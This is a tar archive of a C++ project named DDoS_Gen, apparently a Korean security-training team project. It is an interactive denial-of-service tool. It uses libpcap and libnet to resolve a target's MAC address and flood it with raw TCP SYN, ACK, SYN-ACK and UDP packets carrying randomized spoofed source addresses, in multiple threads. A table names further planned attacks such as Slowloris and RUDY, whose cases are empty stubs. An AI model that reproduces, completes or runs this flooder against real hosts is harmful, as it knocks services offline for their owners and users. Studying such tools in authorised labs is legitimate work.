DDoS_Gen/lib/                                                                                       0000755 0001750 0001750 00000000000 13720374577 011363  5                                                                                                    ustar   seo                             seo                                                                                                                                                                                                                    DDoS_Gen/lib/pktclass.h                                                                             0000644 0001750 0001750 00000002313 13720374733 013351  0                                                                                                    ustar   seo                             seo                                                                                                                                                                                                                    #pragma once
#include <pcap.h>
#include "pkttypes.h"
#include "others.h"

class PKT{
    private:
        ////// for pcap.h //////
        char* dev;
        pcap_t* pcap_handler;
        char errbuf[PCAP_ERRBUF_SIZE];
        int pcap_res;
        
        ////// packet pointer /////
        const uint8_t* pkt_ptr;
        ETHIPTCP* tcp;
        ETHIPUDP* udp;
        ETHIPICMP* icmp;
        
        ////// 패킷 속성 //////
        int pkttype;
        int pktsize;

        // 패킷 만들기 내부 함수 //
        void make_common_part(mac_t* target_mac, ip_t target_ip, ETHIPHDR* common);
        void make_tcp_packet(ETHIPTCP* tcp_ptr, int flagtype, int datalen);
        void make_udp_packet(ETHIPUDP* udp_ptr, int datalen);
        void make_icmp_packet();
    public:
        // initialize
        PKT(char* dev);
        ~PKT();

        // functions for setting, make, send packets
        void set_pcap();
        
        // target의 맥주소 받아올 함수
        void set_attackinfo(ip_t target_ip, mac_t* storage);
        
        // 패킷 만드는 함수
        void make_packet(mac_t* target_mac, uint32_t target_ip, int pkttype, int flagtype, int datalen);
        void send_packet();
};                                                                                                                                                                                                                                                                                                                     DDoS_Gen/lib/others.h                                                                               0000644 0001750 0001750 00000001231 13720374577 013035  0                                                                                                    ustar   seo                             seo                                                                                                                                                                                                                    #pragma once
#include <netinet/in.h>
#include <cstdio>
#include <cstdint>
#include <cstdlib>
#include <ctime>
#include <string>
#include <vector>
#include <fstream>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <net/if.h>
#include <unistd.h>
#include <cstring>
#include <libnet/libnet-macros.h>
#include "macros.h"
#include "pkttypes.h"


uint16_t Checksum(uint16_t *addr, uint16_t len);
uint8_t make_byte_rand(int seed);
void fill_rand(uint8_t* storage, int byte_size);

void get_my_mac(char* dev, mac_t* mac);
uint32_t get_my_ip(char* dev);

void get_gateMAC(uint8_t* storage);
void make_MAC_byte(std::string r, uint8_t* storage);                                                                                                                                                                                                                                                                                                                                                                       DDoS_Gen/lib/pkttypes.h                                                                             0000644 0001750 0001750 00000002624 13720374577 013423  0                                                                                                    ustar   seo                             seo                                                                                                                                                                                                                    #pragma once
#include "macros.h"
#include <libnet.h>
#include <cstdint>

// redefine structures in libnet.h
typedef struct libnet_ethernet_hdr ETHHDR;
typedef struct libnet_arp_hdr ARPHDR;
typedef struct libnet_ipv4_hdr IPv4HDR;
typedef struct libnet_icmpv4_hdr ICMPHDR;
typedef struct libnet_tcp_hdr TCPHDR;
typedef struct libnet_udp_hdr UDPHDR;
typedef uint8_t mac_t;
typedef uint32_t ip_t;
typedef uint8_t DATATYPE;

enum L4_TYPE{
    TCP = IPPROTO_TCP,
    UDP = IPPROTO_UDP,
    ICMP = IPPROTO_ICMP
};

enum ATK_TCP_TPYE{
    SYN = TH_SYN,
    ACK = TH_ACK,
    SYN_ACK = TH_SYN | TH_ACK
};

#pragma pack(push, 1)
struct ETHARPHDR{
    ETHHDR eth_hdr;
    ARPHDR arp_hdr;
    mac_t srcmac[ETHER_ADDR_LEN];
    ip_t srcip;
    mac_t dstmac[ETHER_ADDR_LEN];
    ip_t dstip;
};
#pragma pack(pop)

#pragma pack(push, 1)
struct ETHIPHDR{
    ETHHDR eth_hdr;
    IPv4HDR ip_hdr;
};
#pragma pack(pop)

// define packet types
#pragma pack(push, 1)
struct ETHIPTCP{
    ETHHDR eth_hdr;
    IPv4HDR ip_hdr;
    TCPHDR tcp_hdr;
};
#pragma pack(pop)

#pragma pack(push, 1)
struct ETHIPUDP{
    ETHHDR eth_hdr;
    IPv4HDR ip_hdr;
    UDPHDR udp_hdr;
};
#pragma pack(pop)

#pragma pack(push, 1)
struct ETHIPICMP{
    ETHHDR eth_hdr;
    IPv4HDR ip_hdr;
    ICMPHDR icmp_hdr;
};
#pragma pack(pop)

#pragma pack(push, 1)
struct HTTPPKT{
    ETHHDR eth_hdr;
    IPv4HDR ip_hdr;
    TCPHDR tcp_hdr;
    DATATYPE data[];
};
#pragma pack(pop)                                                                                                            DDoS_Gen/lib/atkmod.h                                                                               0000644 0001750 0001750 00000001345 13720374577 013016  0                                                                                                    ustar   seo                             seo                                                                                                                                                                                                                    #pragma once
#include "attacktable.h"
#include "pktclass.h"
#include <arpa/inet.h>
#include <thread>
#include <mutex>
#include <memory>

// TODO: make attack module class
class ATTACKMODULE{
    private:        
        uint16_t bps;
        char* dev;
        int atktype;
        int speed;
        int dur;

        // attack information structure //
        mac_t target_mac[ETHER_ADDR_LEN];
        ip_t target_ip;

        // private functions
        void attack_routine();
        
        // target의 맥주소 받기
        void get_targetinfo(std::string tip);
    public:
        ATTACKMODULE(char* dev, std::string tip, int type, int speed, int dur);
        
        // 외부에서 호출될 함수
        void attack();
};                                                                                                                                                                                                                                                                                           DDoS_Gen/lib/attacktable.h                                                                          0000644 0001750 0001750 00000000134 13720374577 014011  0                                                                                                    ustar   seo                             seo                                                                                                                                                                                                                    #pragma once
#include <iostream>
#include <map>
#include <string>

void print_attacktable();                                                                                                                                                                                                                                                                                                                                                                                                                                    DDoS_Gen/lib/macros.h                                                                               0000644 0001750 0001750 00000000237 13720374577 013022  0                                                                                                    ustar   seo                             seo                                                                                                                                                                                                                    #pragma once

// define thread nums
#define THREADS 5
#define HW_DEV_NAME 10
#define BROADCAST_MAC "ff:ff:ff:ff:ff:ff"
#define DONTKNOW_MAC "00:00:00:00:00:00"                                                                                                                                                                                                                                                                                                                                                                 DDoS_Gen/README.md                                                                                  0000644 0001750 0001750 00000000044 13720374577 012072  0                                                                                                    ustar   seo                             seo                                                                                                                                                                                                                    # DDoS_Gen
BoB 9기 DDoS Generator 
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            DDoS_Gen/src/                                                                                       0000755 0001750 0001750 00000000000 13720376017 011373  5                                                                                                    ustar   seo                             seo                                                                                                                                                                                                                    DDoS_Gen/src/atkmod.cpp                                                                             0000644 0001750 0001750 00000005662 13720375517 013373  0                                                                                                    ustar   seo                             seo                                                                                                                                                                                                                    #include "../lib/atkmod.h"

ATTACKMODULE::ATTACKMODULE(char* dev, std::string tip, int type, int speed, int dur){
    this->dev = dev;
    this->atktype = type;
    this->speed = speed;
    this->dur = dur;

    get_targetinfo(tip);
}

// target의 정보 받아오기 //
void ATTACKMODULE::get_targetinfo(std::string tip){
    
    /* get target ip */
    inet_pton(AF_INET, tip.c_str(), &target_ip);
    
    /* get target mac */
    PKT packet = PKT(dev);
    packet.set_pcap();
    packet.set_attackinfo(target_ip, target_mac);
}

void ATTACKMODULE::attack(){
    std::thread AttackThreads[THREADS];
    
    for(int i = 0; i < THREADS; i++){
        AttackThreads[i] = std::thread(&ATTACKMODULE::attack_routine, this);
    }
    
    for(int i = 0; i < THREADS; i++){
        AttackThreads[i].join();
    }
}

// TODO:make attack_routine function
void ATTACKMODULE::attack_routine(){

    PKT packet(dev);
    packet.set_pcap();

    /* dur동안 send packet하기 */
    struct timeval start, end, current;
    gettimeofday(&start, 0);
    end.tv_sec = start.tv_sec + dur;

    while(1){
        gettimeofday(&current, 0);
        if(current.tv_sec - end.tv_sec >= 0) break;
    
        switch(atktype){

            // TCP_SYN_ATTACK
            case 1:
                packet.make_packet(target_mac, target_ip, TCP, SYN, 0);
                break;
    
            // TCP_ACK_ATTACK
            case 2:
                packet.make_packet(target_mac, target_ip, TCP, ACK, 0);
                break;

            // TCP_SYN-ACK_ATTACK
            case 3:
                packet.make_packet(target_mac, target_ip, TCP, SYN_ACK, 0);
                break;
            /*
            // TCP_CONNECTION_ATTACK
            case 4:

                break;

            // TCP_CONGESTION_CONTROL_ATTACK
            case 5:

                break;
            */

            // TCP_TSNAMI_ATTACK
            case 6:
                packet.make_packet(target_mac, target_ip, TCP, SYN, 1000);
                break;

            // UDP_ATTACK
            case 7:
                packet.make_packet(target_mac, target_ip, UDP, 0, 1000);
                break;

            // ICMP_ATTACK
            case 8:
                //packet.make_packet(tip, ICMP, ?);
                break;

            /*
            // GET_FLOODING_ATTACK
            case 9:

                break;

            // POST_FLOODING_ATTACK
            case 10:

                break;

            // DYNAMIC_HTTP_REQ_FLOODING
            case 11:

                break;

            // SLOWLORIS_ATTACK
            case 12:

                break;

            // SLOWREAD_ATTACK
            case 13:

                break;

            // R-U-D-Y_ATTACK
            case 14:

                break;

            // BIG1_ATTACK
            case 15:

            break;
            */
            default:
                printf("type error");
                break;
        }

    
        packet.send_packet();
    }
}                                                                              DDoS_Gen/src/Makefile                                                                               0000644 0001750 0001750 00000000543 13720374577 013046  0                                                                                                    ustar   seo                             seo                                                                                                                                                                                                                    .SUFFIXES: .cpp .o

CXX = g++

INC = 
LIBS = -lpthread -lnet -lpcap

CXXFLAGS = -g $(INC)

OBJS = others.o attacktable.o pktclass.o atkmod.o main.o
SRCS = others.cpp attacktable.cpp pktclass.cpp atkmod.cpp main.cpp

TARGET = ddos

all: $(TARGET)

$(TARGET) : $(OBJS)
	$(CXX) $(CXXFLAGS) -o $@ $^ $(LIBS)

dep:
	g++ -MM $(INC) $(SRCS)

clean:
	rm *.o ddos
                                                                                                                                                             DDoS_Gen/src/attacktable.cpp                                                                        0000644 0001750 0001750 00000002541 13720374577 014371  0                                                                                                    ustar   seo                             seo                                                                                                                                                                                                                    #include "../lib/attacktable.h"

std::map<int, std::string> attacktable = {  {1, "TCP_SYN_ATTACK"},
                                            {2, "TCP_ACK_ATTACK"},
                                            {3, "TCP_SYN-ACK_ATTACK"},
                                            {4, "TCP_CONNECTION_ATTACK"},
                                            {5, "TCP_CONGESTION_CONTROL_ATTACK"},
                                            {6, "TCP_TSNAMI_ATTACK"},
                                            {7, "UDP_ATTACK"},
                                            {8, "ICMP_ATTACK"},
                                            {9, "GET_FLOODING_ATTACK"},
                                            {10, "POST_FLOODING_ATTACK"},
                                            {11, "DYNAMIC_HTTP_REQ_FLOODING"},
                                            {12, "SLOWLORIS_ATTACK"},
                                            {13, "SLOWREAD_ATTACK"},
                                            {14, "R-U-D-Y_ATTACK"},
                                            {15, "BIG1_ATTACK"}                 };

void print_attacktable(){
    printf("<<<< ATTACK TYPE NUMBER TABLE >>>>\n");
    std::map<int, std::string>::iterator iter;
    for(iter = attacktable.begin(); iter != attacktable.end(); iter++){
        printf("#%2d.\t%s\n", iter->first, iter->second.c_str());
    }
}                                                                                                                                                               DDoS_Gen/src/others.cpp                                                                             0000644 0001750 0001750 00000005301 13720374577 013413  0                                                                                                    ustar   seo                             seo                                                                                                                                                                                                                    #include "../lib/others.h"

uint16_t Checksum(uint16_t *addr, uint16_t len){
    uint32_t sum = 0;
    uint16_t odd = 0;
    uint16_t checkSum = 0;

    while(len > 1){
        sum += *addr++;
        len -= 2;
    }

    if(len == 1){
		*(uint8_t*)(&odd) = *(uint8_t*)addr;
		sum += odd;
	}

    while (sum >> 16){
        sum = (sum & 0xffff) + (sum >> 16);
    }

    checkSum = (uint16_t)~sum;

    return htons(checkSum);
}

void fill_rand(uint8_t* storage, int byte_size){
    for(int i = 0; i < byte_size; i++){
        *storage = make_byte_rand(rand());
        storage++;
    }
}

uint8_t make_byte_rand(int seed){
    srand(seed);
    return (uint8_t)(rand() & 0x000000FF);
}

void get_my_mac(char* dev, mac_t* mac){
	int sockfd;
    struct ifreq ifr;

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
	ifr.ifr_addr.sa_family = AF_INET;
    strncpy((char *)ifr.ifr_name , (const char *)dev, IFNAMSIZ-1);
	ioctl(sockfd, SIOCGIFHWADDR, &ifr);
	
	memcpy(mac, ifr.ifr_hwaddr.sa_data, ETHER_ADDR_LEN);
    close(sockfd);
}

uint32_t get_my_ip(char* dev){
	int sockfd;
    struct ifreq ifr;

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
	ifr.ifr_addr.sa_family = AF_INET;
    strncpy((char *)ifr.ifr_name , (const char *)dev, IFNAMSIZ-1);
	ioctl(sockfd, SIOCGIFADDR, &ifr);
	close(sockfd);
	
	return ((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr.s_addr;
}

/* get gate MAC by opening /proc/net/arp */
void get_gateMAC(uint8_t* storage){
    std::ifstream readinfo("/proc/net/arp");
    
    std::string tmp;
    std::string hw_addr;
    
    while(readinfo.peek() != EOF){
        std::getline(readinfo, tmp);
        if(std::isdigit(tmp.front())){
            std::ofstream gatearp;
            gatearp.open("tmp.txt");
            gatearp.write(tmp.c_str(), tmp.size());
            gatearp.close();
        }
    }
    readinfo.close();

    readinfo.open("tmp.txt");
    std::vector<std::string> internals;
    std::vector<std::string>::iterator iter;

    while(readinfo.peek() != EOF){
        std::getline(readinfo, tmp, ' ');
        if(tmp != "") internals.push_back(tmp);
    }
    readinfo.close();
    
    for(iter = internals.begin(); iter != internals.end(); iter++){
        int idx = (*iter).size()-1;
        if((*iter).substr(idx-1, idx) == ".1"){
            hw_addr = *(iter+3);
            break;
        }
    }

    std::remove("tmp.txt");

    make_MAC_byte(hw_addr, storage);
}

void make_MAC_byte(std::string r, uint8_t* storage){
    uint32_t a, b, c, d, e, f;
    sscanf(r.c_str(), "%02X:%02X:%02X:%02X:%02X:%02X", &a, &b, &c, &d, &e, &f);
    *storage = (uint8_t)a;
    *(storage+1) = (uint8_t)b;
    *(storage+2) = (uint8_t)c;
    *(storage+3) = (uint8_t)d;
    *(storage+4) = (uint8_t)e;
    *(storage+5) = (uint8_t)f;
}                                                                                                                                                                                                                                                                                                                               DDoS_Gen/src/pktclass.cpp                                                                           0000644 0001750 0001750 00000014151 13720375732 013730  0                                                                                                    ustar   seo                             seo                                                                                                                                                                                                                    #include "../lib/pktclass.h"

PKT::PKT(char* dev){
    this->dev = dev;
    srand(time(NULL));
}


PKT::~PKT(){
	pcap_close(pcap_handler);      
}

void PKT::set_pcap(){
	pcap_handler = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (pcap_handler == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		exit(-1);
	}
}

// target의 맥주소를 알아내오기 위해 1번 쓰이는 함수 //
void PKT::set_attackinfo(ip_t target_ip, mac_t* storage){
    ETHARPHDR test_pkt;
    memset(&test_pkt, 0, sizeof(ETHARPHDR));
    make_MAC_byte(BROADCAST_MAC, test_pkt.eth_hdr.ether_dhost);
    get_my_mac(dev, test_pkt.eth_hdr.ether_shost);
    test_pkt.eth_hdr.ether_type = htons(ETHERTYPE_ARP);
    test_pkt.arp_hdr.ar_hrd = htons(ARPHRD_ETHER);
    test_pkt.arp_hdr.ar_pro = htons(ETHERTYPE_IP);         
    test_pkt.arp_hdr.ar_hln = ETHER_ADDR_LEN; 
    test_pkt.arp_hdr.ar_pln = sizeof(in_addr_t);
    test_pkt.arp_hdr.ar_op = htons(ARPOP_REQUEST);
    get_my_mac(dev, test_pkt.srcmac);
    test_pkt.srcip = get_my_ip(dev);
    make_MAC_byte(DONTKNOW_MAC, test_pkt.dstmac);
    test_pkt.dstip = target_ip;

    pktsize = sizeof(ETHARPHDR);
    pkt_ptr = (const uint8_t*)&test_pkt;

    send_packet();

    while(true){
		struct pcap_pkthdr* header;
		ETHARPHDR* packet_ptr;
		
		// listening packets
		pcap_res = pcap_next_ex(pcap_handler, &header, (const u_char**)(&packet_ptr));
		if (pcap_res == 0) continue;
		if (pcap_res == -1 || pcap_res == -2) {
			printf("pcap_next_ex return %d(%s)\n", pcap_res, pcap_geterr(pcap_handler));
			break;
		}
		
		// check if the packet is right
		if((ntohs(packet_ptr->eth_hdr.ether_type) == ETHERTYPE_ARP)
        && std::equal(std::begin(packet_ptr->eth_hdr.ether_dhost), std::begin(packet_ptr->eth_hdr.ether_dhost), std::begin(test_pkt.eth_hdr.ether_shost))){
			/* 5. if right, make attack packet and send */
			memcpy(storage, packet_ptr->eth_hdr.ether_shost, ETHER_ADDR_LEN);
			break;
		}
	}
}

// 패킷 보내기 + 동적할당한 메모리 해제 //
void PKT::send_packet(){
    pcap_res = pcap_sendpacket(pcap_handler, pkt_ptr, pktsize);
	if (pcap_res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", pcap_res, pcap_geterr(pcap_handler));
		exit(-1);
	}
    switch(pkttype){
        case TCP:
            delete tcp; break;
        case UDP:
            delete udp; break;
        case ICMP:
            delete icmp; break;
        default:
            break;
    }
}

void PKT::make_packet(mac_t* target_mac, ip_t target_ip, int pkttype, int flagtype, int datalen){
    this->pkttype = pkttype;
    
    switch(pkttype){
        case TCP:
            tcp = new(ETHIPTCP);
            memset(tcp, 0, sizeof(ETHIPTCP));
            make_common_part(target_mac, target_ip, (ETHIPHDR*)tcp);
            make_tcp_packet(tcp, flagtype, datalen);
            break;

        
        case UDP:
            udp = new(ETHIPUDP);
            memset(udp, 0, sizeof(ETHIPUDP));
            make_common_part(target_mac, target_ip, (ETHIPHDR*)udp);
            make_udp_packet(udp, datalen);
            break;

        /*
        case ICMP:
            icmp = new(ETHIPICMP);
            memset(udp, 0, sizeof(ETHIPICMP));
            make_common_part(target_ip, (ETHIPHDR*)icmp);
            make_icmp_packet();
            pkt_ptr = (const uint8_t*)icmp;
            break;
        */
        default:
            printf("no such packet type\n");
            exit(-1);
    }
}

// 패킷 공통부분 채우기
void PKT::make_common_part(mac_t* target_mac, ip_t target_ip, ETHIPHDR* common){

    // decide eth source, type
    memcpy(common->eth_hdr.ether_dhost, target_mac, ETHER_ADDR_LEN);
    fill_rand(common->eth_hdr.ether_shost, ETHER_ADDR_LEN);
    common->eth_hdr.ether_type = htons(ETHERTYPE_IP);

    // decide common ip header part
    common->ip_hdr.ip_v = 4;                                 
    common->ip_hdr.ip_hl = 5;                                
    common->ip_hdr.ip_tos = IPTOS_LOWDELAY;                  
    fill_rand((uint8_t*)&(common->ip_hdr.ip_id), sizeof(uint16_t));   
    common->ip_hdr.ip_off = htons(IP_DF);                           
    fill_rand((uint8_t*)&common->ip_hdr.ip_ttl, sizeof(uint8_t));    
    fill_rand((uint8_t*)&common->ip_hdr.ip_src.s_addr, sizeof(in_addr_t));
    common->ip_hdr.ip_dst.s_addr = target_ip;
}

// tcp 헤더 채우기
void PKT::make_tcp_packet(ETHIPTCP* tcp_ptr, int flagtype, int datalen){

    /* fill ip protocol as tcp */
    tcp_ptr->ip_hdr.ip_p = IPPROTO_TCP;   
    
    /* fill tcp header */
    fill_rand((uint8_t*)&tcp_ptr->tcp_hdr.th_sport, sizeof(uint16_t));
    tcp_ptr->tcp_hdr.th_dport = htons(80);
    fill_rand((uint8_t*)&tcp_ptr->tcp_hdr.th_seq, sizeof(uint32_t));
    fill_rand((uint8_t*)&tcp_ptr->tcp_hdr.th_ack, sizeof(uint32_t));
    tcp_ptr->tcp_hdr.th_off = 5;
    fill_rand((uint8_t*)&tcp_ptr->tcp_hdr.th_win, sizeof(uint16_t));    //60000~65535되도록 수정필요
    switch(flagtype){
        case SYN:
            tcp_ptr->tcp_hdr.th_flags = TH_SYN;
            break;
        case SYN_ACK:
            tcp_ptr->tcp_hdr.th_flags = TH_SYN | TH_ACK;
            break;
        case ACK:
            tcp_ptr->tcp_hdr.th_flags = TH_ACK;
            break;
    }

    // filling final part
    tcp_ptr->ip_hdr.ip_len = htons(LIBNET_IPV4_H + tcp_ptr->tcp_hdr.th_off * 4 + datalen);
    tcp_ptr->ip_hdr.ip_sum = Checksum((uint16_t*)(&tcp_ptr->ip_hdr), tcp_ptr->ip_hdr.ip_len);
    tcp_ptr->tcp_hdr.th_sum = Checksum((uint16_t*)(&tcp_ptr->tcp_hdr), tcp_ptr->tcp_hdr.th_off);

    pktsize = sizeof(ETHIPTCP) + datalen;
    pkt_ptr = (const uint8_t*)tcp_ptr;
}

void PKT::make_udp_packet(ETHIPUDP* udp_ptr, int datalen){
    udp_ptr->ip_hdr.ip_p = IPPROTO_UDP;   

    fill_rand((uint8_t*)&udp_ptr->udp_hdr.uh_sport, sizeof(uint16_t));
    fill_rand((uint8_t*)&udp_ptr->udp_hdr.uh_dport, sizeof(uint16_t));
    udp_ptr->udp_hdr.uh_ulen = htons(datalen);
    udp_ptr->udp_hdr.uh_sum = 0;

    udp_ptr->ip_hdr.ip_len = htons(LIBNET_IPV4_H + LIBNET_UDP_H + datalen);
    udp_ptr->ip_hdr.ip_sum = Checksum((uint16_t*)(&udp_ptr->ip_hdr), udp_ptr->ip_hdr.ip_len);

    pktsize = sizeof(ETHIPUDP) + datalen;
    pkt_ptr = (const uint8_t*)udp_ptr;
}

void PKT::make_icmp_packet(){

}                                                                                                                                                                                                                                                                                                                                                                                                                       DDoS_Gen/src/main.cpp                                                                               0000644 0001750 0001750 00000003437 13720374577 013043  0                                                                                                    ustar   seo                             seo                                                                                                                                                                                                                    /* Last Update : 2020.07.20
 * Best Of Best 9th team project
 * Team DDoS Gen.
 */

// main loop for ddos
#include "../lib/atkmod.h"
using namespace std;

char dev[HW_DEV_NAME];
string tip;
int type;
int speed;
int dur;
char check;

void get_input();

int main(int argc, char* argv[]){
    
    if(argc != 1){
        printf("Usage: %s\n", argv[0]);
        exit(1);
    }

    cout << "DDoS Attack Program by BoB 9th\n";
    
    while(true){
        get_input();
        while(check != 'y' && check != 'n'){
            cout << "Wrong reply. Please Confirm Again.\n";
            cout << "Are they all right?(y/n)\n";
            cin >> check;
        }
        if(check == 'y') break;
        else cout << "Please Enter Attack Information Again.\n";
    }

    cout << "DDoS Attack Starting...\n";
    ATTACKMODULE DDoS = ATTACKMODULE(dev, tip, type, speed, dur);
    DDoS.attack();

    cout << "attack done" << endl;
    return 0;
}

void get_input(){
    cout << "Enter hardware device - ex) eth0\n";
    cout << "device: ";
    cin >> dev;
    
    cout << "Enter target IP - ex) 192.168.0.1\n";
    cout << "target IP: ";
    cin >> tip;
    
    cout << "Enter attack type in number\n";
    print_attacktable();
    cout << "attack type: ";
    cin >> type;
    
    cout << "Enter attack speed in [Mbps]\n";
    cout << "attack speed: ";
    cin >> speed;
    
    cout << "Enter attack time in [sec]\n";
    cout << "attacking time: "; 
    cin >> dur;

    cout << "\nCheck your DDoS Attack settings\n";
    
    cout << "device: " << dev << '\n';
    cout << "target IP: " << tip << '\n';
    cout << "attack type: " << '#' << type << '\n';
    cout << "attack speed: " << speed << " [Mbps]\n";
    cout << "attacking time: " << dur << " [sec]\n";

    cout << "Are they all right?(y/n)\n";
    cin >> check;
}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 